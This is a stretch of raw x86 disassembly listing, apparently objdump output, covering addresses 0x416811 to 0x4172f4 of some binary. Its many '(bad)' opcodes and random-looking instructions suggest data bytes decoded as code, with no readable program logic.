  416811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416812:	pop    eax
  416813:	out    dx,eax
  416814:	stos   DWORD PTR es:[edi],eax
  416815:	mov    ch,0x53
  416817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416818:	std    
  416819:	(bad)  
  41681a:	fst    st(6)
  41681c:	ficomp WORD PTR [ebp+eiz*8+0x2cc441ee]
  416823:	pop    ss
  416824:	rol    BYTE PTR [edx+0x17],0x5e
  416828:	push   eax
  416829:	inc    ecx
  41682a:	lods   al,BYTE PTR ds:[esi]
  41682b:	mov    esp,0x80b525d7
  416830:	add    eax,ebx
  416832:	and    BYTE PTR [edx+0x2572d726],bh
  416838:	lahf   
  416839:	shl    BYTE PTR [ebp+ecx*2-0x49684856],cl
  416840:	cmp    BYTE PTR [esi],0x75
  416843:	mov    esi,0x9390674f
  416848:	xor    eax,0xe6e052b0
  41684d:	inc    eax
  41684e:	pop    ebx
  41684f:	or     al,0xc4
  416851:	sub    edx,edi
  416853:	mov    edi,0x6b2a3cc5
  416858:	sub    BYTE PTR [edi],bh
  41685a:	shl    ebp,1
  41685c:	xor    ah,bh
  41685e:	adc    al,0x7
  416860:	repnz push ecx
  416862:	inc    edx
  416863:	repnz inc ebp
  416865:	mov    esp,0x32581527
  41686a:	test   DWORD PTR [edx+0x2c],0x6a0d3b40
  416871:	jle    0x41689b
  416873:	mov    WORD PTR [edi-0x12],fs
  416876:	push   ds
  416877:	out    0xb5,al
  416879:	pusha  
  41687a:	mov    ah,0xb7
  41687c:	(bad)  
  41687d:	cmp    edi,DWORD PTR [edi+0x45]
  416880:	aaa    
  416881:	jae    0x4168e1
  416883:	pop    edx
  416884:	pop    edi
  416885:	test   eax,0x17a33dd5
  41688a:	sub    eax,0x2063e86d
  41688f:	fimul  DWORD PTR [edx-0x264c9835]
  416895:	cdq    
  416896:	adc    al,0x4a
  416898:	shr    al,cl
  41689a:	rol    BYTE PTR cs:[eax-0x3b],cl
  41689e:	mov    dl,0xc9
  4168a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168a1:	outs   dx,DWORD PTR ds:[esi]
  4168a2:	fidiv  WORD PTR [ecx-0x43]
  4168a5:	retf   
  4168a6:	or     al,0x52
  4168a8:	add    eax,0x86618c19
  4168ad:	mov    ch,0x37
  4168af:	lahf   
  4168b0:	popf   
  4168b1:	pop    es
  4168b2:	out    0x97,al
  4168b4:	push   0xdaaaa55a
  4168b9:	xor    BYTE PTR [ebx+eax*1+0x7045988f],0x9f
  4168c1:	ins    DWORD PTR es:[edi],dx
	...
  416932:	add    BYTE PTR [eax],al
  416934:	inc    ebp
  416935:	mov    BYTE PTR [edi+esi*2],ch
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [edx-0x27dd90c4],ebx
  416945:	test   BYTE PTR [eax],0x0
  416948:	test   BYTE PTR [eax],0x0
  41694b:	add    BYTE PTR [ebx+0xb],bl
  41694e:	lock icebp 
  416950:	cs pop es
  416952:	and    dh,al
  416954:	addr16 push eax
  416956:	cmp    BYTE PTR [ecx],0x1a
  416959:	psrlq  mm6,QWORD PTR [ebp+0x1c69002c]
  416960:	pop    eax
  416961:	xor    eax,eax
  416963:	sub    BYTE PTR [ebx-0x5c8093f5],dl
  416969:	mov    edx,0x3d595c96
  41696e:	pop    eax
  41696f:	out    0xac,al
  416971:	xchg   ebp,eax
  416972:	js     0x4169d4
  416974:	and    al,0xfa
  416976:	jecxz  0x416972
  416978:	repz jg 0x416937
  41697b:	xor    DWORD PTR [esi+ebp*2-0xb],ebx
  41697f:	add    BYTE PTR [edx],dh
  416981:	xchg   DWORD PTR [eax+0x6ed670d3],eax
  416987:	shr    BYTE PTR [esp+eiz*4],0xd0
  41698b:	enter  0xccd6,0x61
  41698f:	jge    0x4169e4
  416991:	adc    esp,DWORD PTR [ebx]
  416993:	cmp    ecx,0x57
  416996:	enter  0x2607,0xd5
  41699a:	imul   edx,DWORD PTR [ecx],0xfffffffc
  41699d:	sbb    eax,0x4d67679b
  4169a2:	mov    esi,0xdc57a7e4
  4169a7:	xchg   ebx,eax
  4169a8:	pop    ebp
  4169a9:	mov    esi,0x1f310409
  4169ae:	repz jno 0x416942
  4169b1:	cmp    eax,0xba182598
  4169b6:	aad    0xef
  4169b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169b9:	push   cs
  4169ba:	pop    ebp
  4169bb:	lock loope 0x416997
  4169be:	mov    al,0xa
  4169c0:	or     DWORD PTR [edi+0x8],edi
  4169c3:	or     sp,0x6b
  4169c7:	test   al,0x50
  4169c9:	xor    bh,BYTE PTR [esp+edi*4-0x29223037]
  4169d0:	(bad)  
  4169d1:	nop
  4169d2:	push   ds
  4169d3:	int    0xed
  4169d5:	push   0x27541187
  4169da:	pop    edi
  4169db:	lea    ecx,[edi-0x70]
  4169de:	mov    esp,0x1994e5f9
  4169e3:	push   ebx
  4169e4:	ins    BYTE PTR es:[edi],dx
  4169e5:	adc    dh,BYTE PTR [eax+ebp*4]
  4169e8:	shr    DWORD PTR [ecx-0x40b4f4cc],0xe6
  4169ef:	int    0x50
  4169f1:	mov    ch,0x37
  4169f3:	push   es
  4169f4:	aad    0x5c
  4169f6:	scas   al,BYTE PTR es:[edi]
  4169f7:	jg     0x416980
  4169f9:	jmp    0x416a5f
  4169fb:	neg    BYTE PTR [edi]
  4169fd:	inc    esi
  4169fe:	add    BYTE PTR [ebx],dl
  416a00:	icebp  
  416a01:	into   
  416a02:	jo     0x416a14
  416a04:	outs   dx,DWORD PTR ds:[esi]
  416a05:	push   edx
  416a06:	or     ch,BYTE PTR [esi]
  416a08:	test   eax,0x1d468747
  416a0d:	ja     0x416a32
  416a0f:	push   0xfa275924
  416a14:	or     DWORD PTR [edx+edi*8-0x5de8966e],0x81ae7b8c
  416a1f:	sahf   
  416a20:	sub    eax,0x7ea69a92
  416a25:	sbb    BYTE PTR [edx+esi*4],0x62
  416a29:	mov    al,0x24
  416a2b:	(bad)  
  416a2c:	mov    ecx,0x6ee7a602
  416a31:	inc    edx
  416a32:	std    
  416a33:	push   edi
  416a34:	aaa    
  416a35:	push   eax
  416a36:	ins    DWORD PTR es:[edi],dx
  416a37:	in     eax,0xa5
  416a39:	xchg   ebx,eax
  416a3a:	(bad)  
  416a3b:	ret    0x6f92
  416a3e:	mov    ds:0x7883d4,al
	...
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx+0x1e365652]
  416ac3:	dec    ebx
  416ac4:	into   
  416ac5:	test   DWORD PTR [eax],0xf600
  416acb:	add    bh,dh
  416acd:	mov    edi,0x20fadd1e
  416ad2:	xchg   edx,eax
  416ad3:	inc    esp
  416ad4:	out    dx,al
  416ad5:	nop
  416ad6:	stc    
  416ad7:	adc    esi,DWORD PTR [edx-0x1122eb4a]
  416add:	int3   
  416ade:	sub    DWORD PTR ds:0xe254917a,0x56
  416ae5:	dec    esi
  416ae6:	shr    BYTE PTR [ebx],cl
  416ae8:	xchg   BYTE PTR [ebx],bl
  416aea:	fdiv   DWORD PTR [edx+ebx*4+0x254ac01]
  416af1:	(bad)  
  416af2:	mov    ss,edx
  416af4:	lods   al,BYTE PTR ds:[esi]
  416af5:	sti    
  416af6:	sbb    edx,edx
  416af8:	push   eax
  416af9:	push   eax
  416afa:	push   esi
  416afb:	les    esi,FWORD PTR [edi+0x2a56d05b]
  416b01:	retf   0x45e2
  416b04:	stos   BYTE PTR es:[edi],al
  416b05:	push   esi
  416b06:	retf   
  416b07:	adc    DWORD PTR [ebx],eax
  416b09:	in     eax,dx
  416b0a:	push   0x6e
  416b0c:	push   eax
  416b0d:	add    ebp,DWORD PTR [ecx-0x71d6534d]
  416b13:	inc    ebp
  416b14:	(bad)  
  416b15:	jmp    0x6ac00f29
  416b1a:	push   0x5b
  416b1c:	mov    dl,0xc
  416b1e:	add    al,BYTE PTR [esi+0x52]
  416b21:	ret    
  416b22:	nop
  416b23:	pop    ds
  416b24:	aas    
  416b25:	pop    ds
  416b26:	add    eax,0x12401f40
  416b2b:	jmp    0x6e60afd8
  416b30:	adc    al,0xbc
  416b32:	pop    eax
  416b33:	addr16 pop ds
  416b35:	xor    eax,0x1e2b8a2
  416b3a:	xor    al,0xbc
  416b3c:	cmp    DWORD PTR fs:[ebx-0x77837138],0x27df0bea
  416b47:	xchg   ebx,eax
  416b48:	pop    ebx
  416b49:	js     0x416b85
  416b4b:	pop    esi
  416b4c:	inc    ebp
  416b4d:	dec    ebp
  416b4e:	sub    dl,BYTE PTR ds:0x9a7e63f0
  416b54:	fbld   TBYTE PTR [esi-0x6f43534]
  416b5a:	mov    bh,0x54
  416b5c:	scas   al,BYTE PTR es:[edi]
  416b5d:	hlt    
  416b5e:	gs aad 0x9c
  416b61:	mov    ebp,0x1d85afbf
  416b66:	sub    dl,bl
  416b68:	jnp    0x416bc9
  416b6a:	das    
  416b6b:	xchg   ecx,eax
  416b6c:	and    edx,ebx
  416b6e:	(bad)  
  416b6f:	lods   al,BYTE PTR ds:[esi]
  416b70:	or     al,0xce
  416b72:	sub    al,0x9c
  416b74:	arpl   bp,cx
  416b76:	shl    DWORD PTR [edi],0x46
  416b79:	out    0xfe,al
  416b7b:	pop    eax
  416b7c:	mov    al,0xd4
  416b7e:	out    0xea,al
  416b80:	mov    DWORD PTR [edi-0x25],esp
  416b83:	xchg   esp,eax
  416b84:	(bad)  
  416b85:	test   DWORD PTR [esi],0xfa1e89c1
  416b8b:	js     0x416bbc
  416b8d:	(bad)  
  416b8e:	mov    ds:0x7d665724,al
  416b93:	sub    DWORD PTR [ecx-0x6c],edx
  416b96:	imul   ebx,ebp,0x5b9a3778
  416b9c:	jmp    0x416bb0
  416b9e:	cmp    DWORD PTR [eax-0x28],esp
  416ba1:	jge    0x416b9c
  416ba3:	inc    esi
  416ba4:	aas    
  416ba5:	mov    esp,0x5b3a5fd0
  416baa:	adc    DWORD PTR [edx],eax
  416bac:	(bad)  
  416bad:	(bad)  
  416bae:	fs cwde 
  416bb0:	sahf   
  416bb1:	pop    edi
  416bb2:	cmp    eax,0xdc3a588c
  416bb7:	fnstenv [eax]
  416bb9:	jne    0x416bc1
  416bbb:	mov    ch,0x6d
  416bbd:	sub    DWORD PTR ss:[eax+0x5844],0x0
	...
  416c34:	cmp    dl,BYTE PTR [eax]
  416c36:	mov    edi,0xbbbfbf3c
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    edx,DWORD PTR [esi]
  416c41:	push   ds
  416c42:	jns    0x416c25
  416c44:	(bad)  
  416c45:	clc    
  416c46:	add    BYTE PTR [eax],al
  416c48:	test   BYTE PTR [eax],0x0
  416c4b:	add    BYTE PTR [ecx+0xa],dh
  416c4e:	pop    esp
  416c4f:	xchg   ch,bl
  416c51:	mov    eax,0xbcf891cf
  416c56:	imul   esp,DWORD PTR [edi-0x355cc01d],0x6695ae6b
  416c60:	pop    ebp
  416c61:	jge    0x416c3d
  416c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c64:	outs   dx,DWORD PTR ds:[esi]
  416c65:	test   DWORD PTR [esi],0x9ce4cf1a
  416c6b:	cli    
  416c6c:	in     al,dx
  416c6d:	adc    al,0x93
  416c6f:	xchg   ecx,eax
  416c70:	sbb    al,0xe8
  416c72:	mov    ?,WORD PTR [edx]
  416c74:	cmp    bl,BYTE PTR [ecx]
  416c76:	adc    BYTE PTR [edx-0x3b300ae0],0x5c
  416c7d:	and    edx,edi
  416c7f:	mov    cl,0x6b
  416c81:	je     0x416c56
  416c83:	fbld   TBYTE PTR [edx+0x386bdbe2]
  416c89:	mov    ds:0xd5923620,eax
  416c8e:	mov    edi,0xe71b0cf3
  416c93:	in     eax,0xfe
  416c95:	fstp   TBYTE PTR [edi+0x4e1292fe]
  416c9b:	fyl2xp1 
  416c9d:	pop    esp
  416c9e:	or     al,BYTE PTR [ecx+0x2842bafc]
  416ca4:	add    bh,al
  416ca6:	in     al,0x42
  416ca8:	inc    esi
  416ca9:	add    edi,DWORD PTR [edi-0x5bbfd413]
  416caf:	xchg   ecx,eax
  416cb0:	adc    BYTE PTR [esi-0x4],0x3c
  416cb4:	push   eax
  416cb5:	(bad)  
  416cb6:	jmp    0x416c68
  416cb8:	dec    esi
  416cb9:	add    ch,BYTE PTR [esi+0x3c]
  416cbc:	dec    ebx
  416cbd:	push   esi
  416cbe:	popf   
  416cbf:	cmp    eax,0x3da56234
  416cc4:	and    ah,BYTE PTR [ecx]
  416cc6:	lahf   
  416cc7:	aas    
  416cc8:	sub    ebx,DWORD PTR [edx+0x56]
  416ccb:	popf   
  416ccc:	sub    ebx,DWORD PTR [edx-0x1160dc85]
  416cd2:	or     eax,0xf903740f
  416cd7:	les    ebx,FWORD PTR [esi-0x419e991f]
  416cdd:	and    al,0xb0
  416cdf:	mov    bh,0x45
  416ce1:	mov    eax,0xd5e43203
  416ce6:	pop    ecx
  416ce7:	dec    ebp
  416ce8:	fwait
  416ce9:	mov    WORD PTR [edx+0xc],ds
  416cec:	pop    esi
  416ced:	inc    ecx
  416cee:	stos   DWORD PTR es:[edi],eax
  416cef:	jle    0x416cc9
  416cf1:	and    ah,BYTE PTR [ebx]
  416cf3:	mov    dh,0xad
  416cf5:	mov    esp,0x6d96fa36
  416cfa:	xor    DWORD PTR [edi-0x4e206c80],0x15
  416d01:	mov    eax,0xb4c61988
  416d06:	into   
  416d07:	xor    DWORD PTR [ebp+ebp*8-0x49a5b29b],ecx
  416d0e:	mov    cl,BYTE PTR [eax+0x4eaff2a4]
  416d14:	mov    ebp,0x803af086
  416d19:	leave  
  416d1a:	xor    ebp,DWORD PTR [edi]
  416d1c:	mov    esi,0x9be960d1
  416d21:	test   BYTE PTR [esp+ebp*4],bh
  416d24:	inc    ebx
  416d25:	jb     0x416ce9
  416d27:	push   ss
  416d28:	sbb    eax,0xd6884dd6
  416d2d:	popa   
  416d2e:	daa    
  416d2f:	mov    dh,0xee
  416d31:	mov    esi,0x917985ed
  416d36:	and    DWORD PTR [edx+0x42],esi
  416d39:	ins    BYTE PTR es:[edi],dx
  416d3a:	sbb    sp,bx
  416d3d:	pop    esi
  416d3e:	(bad)  
  416d3f:	push   ds
  416d40:	push   es
  416d41:	xchg   DWORD PTR [eax],eax
	...
  416db3:	add    dh,ch
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0xd6e46ab8
  416dc4:	mov    edx,0xf60000f9
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    cl,cl
  416dcd:	in     al,dx
  416dce:	or     al,0x19
  416dd0:	jp     0x416da7
  416dd2:	jmp    0x416d93
  416dd4:	push   cs
  416dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dd6:	add    dh,BYTE PTR [eax+ecx*8-0x6a]
  416dda:	jns    0x416e0b
  416ddc:	add    eax,0x45255c62
  416de1:	pop    edx
  416de2:	ds daa 
  416de4:	adc    DWORD PTR [edx-0xd],0x12
  416de8:	xchg   ebp,eax
  416de9:	lods   eax,DWORD PTR ds:[esi]
  416dea:	push   0x6d
  416dec:	add    dh,ah
  416dee:	stos   DWORD PTR es:[edi],eax
  416def:	test   BYTE PTR [esp+edi*2],bl
  416df2:	mov    esp,0xce86913e
  416df7:	sbb    DWORD PTR [ebp-0x645f1ad8],0x348f8636
  416e01:	retf   
  416e02:	and    BYTE PTR [eax-0x2a],dh
  416e05:	ds mov ebx,0x8d56578
  416e0b:	cli    
  416e0c:	xchg   BYTE PTR [edi+0x61],dl
  416e0f:	push   ebx
  416e10:	sbb    BYTE PTR es:[ecx],ah
  416e13:	(bad)  
  416e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e15:	sti    
  416e16:	out    0x8d,eax
  416e18:	push   esi
  416e19:	mov    BYTE PTR [edx+ebx*1-0x194324ca],bh
  416e20:	push   eax
  416e21:	xchg   ebx,eax
  416e22:	push   0x64
  416e24:	push   ebx
  416e25:	add    ch,cl
  416e27:	shr    DWORD PTR [edx+0x30],cl
  416e2a:	aad    0xce
  416e2c:	add    BYTE PTR [ecx+0x39],bh
  416e2f:	xor    al,0xe4
  416e31:	(bad)  
  416e32:	(bad)  
  416e33:	push   ecx
  416e34:	cmp    bl,BYTE PTR [esi-0x29]
  416e37:	sub    eax,0x98e4a422
  416e3c:	ins    BYTE PTR es:[edi],dx
  416e3d:	imul   ebx,DWORD PTR [eax-0xd],0xb25e72d9
  416e44:	mov    ch,0x68
  416e46:	bound  eax,QWORD PTR [ecx]
  416e48:	jno    0x416de8
  416e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e4b:	or     eax,0xfbe8c4f
  416e50:	mov    esp,0x5df88f50
  416e55:	sub    BYTE PTR [edi],dh
  416e57:	into   
  416e58:	jp     0x416e38
  416e5a:	cmc    
  416e5b:	or     ebx,ebx
  416e5d:	cdq    
  416e5e:	inc    esi
  416e5f:	inc    eax
  416e60:	xlat   BYTE PTR ds:[ebx]
  416e61:	mov    DWORD PTR [esp+ebx*8+0x623eaf49],eax
  416e68:	jp     0x416e33
  416e6a:	push   ss
  416e6b:	mov    BYTE PTR [esi-0x5c],al
  416e6e:	lock push edi
  416e70:	push   ecx
  416e71:	xor    esp,ecx
  416e73:	jp     0x416ecf
  416e75:	pop    ebp
  416e76:	or     eax,0x74daaf12
  416e7b:	stc    
  416e7c:	jle    0x416e68
  416e7e:	mov    dh,0x68
  416e80:	push   esp
  416e81:	push   ebp
  416e82:	mov    ds:0x9897d86a,al
  416e87:	mov    edx,0x98002c28
  416e8c:	rcl    DWORD PTR [ebx+0x2a1d088],cl
  416e92:	xchg   ebp,eax
  416e93:	inc    esi
  416e94:	mov    bl,0x6d
  416e96:	sub    ebx,ecx
  416e98:	aad    0xa
  416e9a:	add    DWORD PTR [ecx+0x7e],eax
  416e9d:	loope  0x416ef3
  416e9f:	xor    ebx,ebp
  416ea1:	mov    eax,0xa3f75b3c
  416ea6:	or     esp,edx
  416ea8:	dec    edi
  416ea9:	repz fst QWORD PTR [ecx-0x78]
  416ead:	rcl    BYTE PTR ds:0xe073d792,0xd2
  416eb4:	ins    BYTE PTR es:[edi],dx
  416eb5:	push   edx
  416eb6:	test   DWORD PTR ds:0x97cd2b92,0x4430294a
  416ec0:	fsubrp st(1),st
	...
  416f32:	add    BYTE PTR [eax],al
  416f34:	pop    ss
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	mov    ch,0xe0
  416f42:	inc    ebp
  416f43:	jmp    0x4269f8
  416f48:	test   BYTE PTR [eax],0x0
  416f4b:	add    BYTE PTR [ecx+0x4f],bh
  416f4e:	jge    0x416eff
  416f50:	lods   eax,DWORD PTR ds:[esi]
  416f51:	outs   dx,DWORD PTR ds:[esi]
  416f52:	shr    DWORD PTR [eax],cl
  416f54:	fadd   DWORD PTR [edi+eiz*8-0x4004bc36]
  416f5b:	dec    esi
  416f5c:	cs call 0x821a53bc
  416f62:	pop    eax
  416f63:	test   ah,al
  416f65:	out    dx,eax
  416f66:	int3   
  416f67:	or     al,0xae
  416f69:	retf   0x6f37
  416f6c:	stos   DWORD PTR es:[edi],eax
  416f6d:	and    eax,0xbab639aa
  416f72:	xchg   ebp,eax
  416f73:	cmp    al,BYTE PTR [ebx-0x51a0ef56]
  416f79:	pop    ss
  416f7a:	dec    edi
  416f7b:	mov    cl,0x6b
  416f7d:	je     0x416fa7
  416f7f:	push   edx
  416f80:	mov    bh,0xe2
  416f82:	mov    ecx,0x3264b3b3
  416f87:	dec    esp
  416f88:	xor    ebx,DWORD PTR [ebp+0x6b9c2aa5]
  416f8e:	sahf   
  416f8f:	sub    al,0x43
  416f91:	sbb    eax,0xd5b0571d
  416f96:	test   al,0x3b
  416f98:	mov    ebx,0x10587331
  416f9d:	xor    dh,bh
  416f9f:	mov    esi,0x655c5405
  416fa4:	fdiv   DWORD PTR [esp+ebx*1+0xd03d6b6]
  416fab:	pop    ebp
  416fac:	cld    
  416fad:	cmp    BYTE PTR [ecx-0x66a0c53f],bl
  416fb3:	(bad)  
  416fb4:	xchg   edi,eax
  416fb5:	icebp  
  416fb6:	or     bh,BYTE PTR [ecx-0x388a7205]
  416fbc:	mov    edx,edx
  416fbe:	mov    esp,?
  416fc0:	dec    esp
  416fc1:	and    DWORD PTR [edi-0x73],esi
  416fc4:	imul   ebp,DWORD PTR [edi],0x69ec91c8
  416fca:	(bad)  
  416fcb:	push   0x6f
  416fcd:	das    
  416fce:	push   ebx
  416fcf:	pushf  
  416fd0:	retf   
  416fd1:	or     eax,0x1fe1fc68
  416fd6:	jbe    0x417015
  416fd8:	out    0x32,al
  416fda:	push   es
  416fdb:	and    esp,DWORD PTR ds:0x8906f786
  416fe1:	mov    ecx,DWORD PTR [ebx+0x5e5b406a]
  416fe7:	sbb    esp,eax
  416fe9:	pop    edx
  416fea:	and    al,0x66
  416fec:	pop    esp
  416fed:	xchg   ebx,eax
  416fee:	push   ecx
  416fef:	mov    bl,0x74
  416ff1:	xor    eax,0xd2e45432
  416ff6:	and    eax,0xf4c76e6d
  416ffb:	mov    esi,0x2da78520
  417000:	mov    eax,ds:0x531c7890
  417005:	push   es
  417006:	mov    bl,0xc0
  417008:	mov    ds:0x1e309c3d,al
  41700d:	add    DWORD PTR [esi],esp
  41700f:	ret    
  417010:	sub    BYTE PTR [ebx+0x66],dl
  417013:	test   DWORD PTR [ecx+0x2e],edx
  417016:	sub    ecx,esi
  417018:	cmp    eax,0x44cd9afd
  41701d:	fnstsw WORD PTR [ebx]
  41701f:	scas   eax,DWORD PTR es:[edi]
  417020:	jo     0x417074
  417022:	in     al,0xb5
  417024:	push   ecx
  417025:	adc    dh,al
  417027:	fidivr DWORD PTR [esi+edx*1+0x20]
  41702b:	das    
  41702c:	fucomp st(5)
  41702e:	cmp    al,bl
  417030:	inc    ecx
  417031:	sti    
  417032:	push   esi
  417033:	cld    
  417034:	add    ebp,DWORD PTR [edx+ebx*1]
  417037:	sbb    cl,BYTE PTR [ecx]
  417039:	lahf   
  41703a:	jae    0x416fe5
  41703c:	jbe    0x417079
  41703e:	cdq    
  41703f:	add    eax,0x5611
	...
  4170b4:	and    cl,ch
  4170b6:	cmp    ebx,esi
  4170b8:	sti    
  4170b9:	fsubrp st(5),st
  4170bb:	dec    DWORD PTR [ecx+0x49]
  4170be:	ret    
  4170bf:	or     DWORD PTR [eax-0x6d],0x8
  4170c3:	aam    0xa6
  4170c5:	sti    
  4170c6:	add    BYTE PTR [eax],al
  4170c8:	test   BYTE PTR [eax],0x0
  4170cb:	add    BYTE PTR [edi],al
  4170cd:	or     al,0xc
  4170cf:	xchg   edi,eax
  4170d0:	(bad)  
  4170d2:	jmp    0x417068
  4170d4:	icebp  
  4170d5:	push   ebx
  4170d6:	jmp    0xb92f7d2a
  4170db:	hlt    
  4170dc:	xchg   ebp,eax
  4170dd:	push   edi
  4170de:	sbb    al,0xc5
  4170e0:	leave  
  4170e1:	xlat   BYTE PTR ds:[ebx]
  4170e2:	xchg   esi,eax
  4170e3:	push   es
  4170e4:	dec    ebp
  4170e5:	gs (bad) 
  4170e7:	leave  
  4170e8:	or     cl,bh
  4170ea:	add    BYTE PTR [esi+ecx*1-0x1c],ch
  4170ee:	add    dh,BYTE PTR [ecx-0x4c45f1bb]
  4170f4:	out    0x6c,al
  4170f6:	mov    DWORD PTR [edi-0x23],ebp
  4170f9:	adc    eax,0x1761e72d
  4170fe:	nop
  4170ff:	adc    bh,BYTE PTR ds:[esi-0x35]
  417103:	jns    0x417111
  417105:	ja     0x417120
  417107:	lods   al,BYTE PTR ds:[esi]
  417108:	cmp    ecx,DWORD PTR [edi]
  41710a:	mov    esp,0x258cd4c1
  41710f:	int3   
  417110:	ret    
  417111:	out    0xeb,eax
  417113:	push   esi
  417114:	xchg   ebp,eax
  417115:	js     0x4170fa
  417117:	addr16 dec esp
  417119:	aam    0xac
  41711b:	enter  0xfd51,0x34
  41711f:	mov    DWORD PTR [edi-0x2e0902b0],esp
  417125:	xor    DWORD PTR fs:[ebp-0x2a],0xa1c6a836
  41712d:	and    BYTE PTR [ebx+0x2c],0x12
  417131:	repnz sub ah,ch
  417134:	mul    BYTE PTR [edx-0x2e]
  417137:	cli    
  417138:	add    edx,DWORD PTR [eax]
  41713a:	es and eax,0x7d6b6df3
  417140:	xor    eax,0x58192398
  417145:	cwde   
  417146:	xor    eax,0x3f276489
  41714b:	sbb    BYTE PTR [eax+0x1d],cl
  41714e:	cmp    esp,DWORD PTR [ebx+ecx*8+0x29708f7c]
  417155:	in     eax,dx
  417156:	lahf   
  417157:	xchg   edx,eax
  417158:	jno    0x4171a7
  41715a:	cdq    
  41715b:	cli    
  41715c:	mov    edx,0xe76384bf
  417161:	adc    eax,0x314fdcc2
  417166:	aam    0x58
  417168:	push   0xaab9712d
  41716d:	or     al,0x92
  41716f:	inc    ebx
  417170:	xchg   BYTE PTR [ebx+esi*1-0x6666044],bh
  417177:	repnz pop eax
  417179:	in     eax,0x65
  41717b:	bound  ebp,QWORD PTR [edi+0x28]
  41717e:	mov    edx,DWORD PTR [ebp-0x73]
  417181:	stos   DWORD PTR es:[edi],eax
  417182:	xchg   DWORD PTR es:[ebx-0x609746],ecx
  417189:	xor    eax,0x9a9ae110
  41718e:	ja     0x417126
  417190:	jae    0x41715f
  417192:	push   ecx
  417193:	pop    ss
  417194:	push   edx
  417195:	icebp  
  417196:	bound  ecx,QWORD PTR [edx+0x48]
  417199:	or     eax,0x278ec159
  41719e:	(bad)  
  41719f:	aam    0xa6
  4171a1:	iret   
  4171a2:	out    0x97,al
  4171a4:	ins    BYTE PTR es:[edi],dx
  4171a5:	jg     0x4171e6
  4171a7:	fisub  WORD PTR [edx-0x29]
  4171aa:	lds    esi,FWORD PTR [eax]
  4171ac:	inc    ebp
  4171ad:	and    eax,DWORD PTR [edx]
  4171af:	pop    eax
  4171b0:	xchg   BYTE PTR [ebp+0x1f],dl
  4171b3:	ffree  st(2)
  4171b5:	lock aas 
  4171b7:	sub    eax,0xc111dc85
  4171bc:	fstp   DWORD PTR [ebp+0xb7261eb]
	...
  417232:	add    BYTE PTR [eax],al
  417234:	and    ebp,DWORD PTR [esi+0x32]
  417237:	and    eax,0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	data16 cmp BYTE PTR [ecx-0x27],dl
  417243:	add    BYTE PTR [esp+edi*8+0xf60000],bl
  41724a:	add    BYTE PTR [eax],al
  41724c:	cwde   
  41724d:	stos   DWORD PTR es:[edi],eax
  41724e:	retf   
  41724f:	pop    ecx
  417250:	pop    esp
  417251:	jno    0x4172c0
  417253:	rcr    BYTE PTR [ebx+0x11],0x23
  417257:	mov    bh,0x82
  417259:	xchg   edi,eax
  41725a:	dec    edi
  41725b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41725c:	jp     0x41724a
  41725e:	retf   
  41725f:	ds add al,ch
  417262:	mov    al,ds:0xeef2451b
  417267:	jae    0x417208
  417269:	shl    eax,0x61
  41726c:	lods   al,BYTE PTR ds:[esi]
  41726d:	cmp    al,0x20
  41726f:	sti    
  417270:	xchg   esi,eax
  417271:	inc    al
  417273:	fisttp QWORD PTR ds:0x587434e1
  417279:	inc    esi
  41727a:	mov    WORD PTR ds:[edx-0x4b0891b8],es
  417281:	jmp    0x4172b4
  417283:	xchg   esi,eax
  417284:	repz cmc 
  417286:	iret   
  417287:	push   esi
  417288:	enter  0x5e1d,0xf0
  41728c:	mov    ch,0x38
  41728e:	rcr    DWORD PTR [esi-0x1ab8914c],1
  417294:	rcr    DWORD PTR [esi-0x21c6df6a],1
  41729a:	cmp    esi,DWORD PTR [esi]
  41729c:	cli    
  41729d:	or     DWORD PTR [ebp+0x5f],0x77b5a3ad
  4172a4:	stos   DWORD PTR es:[edi],eax
  4172a5:	and    esi,ebx
  4172a7:	pop    ebx
  4172a8:	jns    0x4172ab
  4172aa:	outs   dx,DWORD PTR ds:[esi]
  4172ab:	ins    BYTE PTR es:[edi],dx
  4172ac:	push   ebx
  4172ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172ae:	pop    ebp
  4172af:	sti    
  4172b0:	mov    bl,0xef
  4172b2:	lahf   
  4172b3:	mov    dl,0x84
  4172b5:	(bad)  
  4172b6:	je     0x417260
  4172b8:	call   0x793c7328
  4172bd:	jb     0x4172aa
  4172bf:	sub    dl,al
  4172c1:	jne    0x417331
  4172c3:	test   BYTE PTR [ebx+0x1b],cl
  4172c6:	adc    eax,0xe4a7ea7b
  4172cb:	test   DWORD PTR [esi+eiz*8+0x4f],ecx
  4172cf:	dec    ebp
  4172d0:	jno    0x417272
  4172d2:	jmp    0xb507:0x3b5e9b45
  4172d9:	or     BYTE PTR [ebx],ah
  4172db:	xor    esp,0xffffffa5
  4172de:	add    bl,BYTE PTR [ebx+0x1]
  4172e1:	xchg   edi,eax
  4172e2:	push   0xfffffff3
  4172e4:	push   eax
  4172e5:	jle    0x41728b
  4172e7:	cmp    BYTE PTR [edi+ecx*8],bl
  4172ea:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4172ec:	mov    eax,ds:0x69a1d35d
  4172f1:	xor    BYTE PTR [ecx-0x1c],bl
  4172f4:	icebp  
